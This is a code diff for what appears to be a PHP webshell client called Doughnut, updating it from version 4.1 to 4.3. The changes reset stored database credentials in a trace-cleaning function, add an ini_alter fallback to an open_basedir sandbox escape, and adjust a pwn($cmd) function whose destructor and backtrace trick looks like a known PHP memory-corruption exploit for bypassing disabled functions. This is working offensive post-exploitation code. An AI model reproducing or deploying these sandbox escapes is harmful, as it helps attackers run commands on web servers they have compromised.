@@ -78,7 +78,7 @@ def banner():
 
 """
         )
-    print(color.green("Doughnut Version: 4.1\n"))
+    print(color.green("Doughnut Version: 4.3\n"))
 
 
 def base64_encode(data: str, encoding="utf-8"):
@@ -167,6 +167,15 @@ def clean_trace():
     gset("webshell.ld_preload_path", None, True, "webshell")
     gset("webshell.ld_preload_func", None, True, "webshell")
     gset("webshell.udf_path", None, True, "webshell")
+    gset("db_dbms", '', True, "webshell")
+    gset("db_ext", '', True, "webshell")
+    gset("db_connect_type", '', True, "webshell")
+    gset("db_connected", False, True, "webshell")
+    gset("db_host", '', True, "webshell")
+    gset("db_username", '', True, "webshell")
+    gset("db_password", '', True, "webshell")
+    gset("db_dbname", '', True, "webshell")
+    gset("db_port", 0, True, "webshell")
 
 
 def r_json(self, **kwargs):
@@ -325,7 +334,11 @@ if($dir === false){
 $r=mkdir($ndir);
 if($r === true){$dir=$ndir;}}
 chdir($dir);
-ini_set("open_basedir","..");
+if(function_exists("ini_set")){
+    ini_set("open_basedir","..");
+} else {
+    ini_alter("open_basedir","..");
+}
 $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
 ini_set("open_basedir", "/");
@@ -448,9 +461,13 @@ function pwn($cmd) {
         public function __destruct() {
             global $backtrace;
             unset($this->a);
-            $backtrace = (new Exception)->getTrace(); # ;)
-            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
-                $backtrace = debug_backtrace();
+            if (class_exists('Exception')) {
+            $backtrace = (new Exception)->getTrace();
+                if(!isset($backtrace[1]['args'])) {
+                    $backtrace = debug_backtrace();
+                }
+            } else {
+            $backtrace = (new Error)->getTrace();
             }
         }
     }
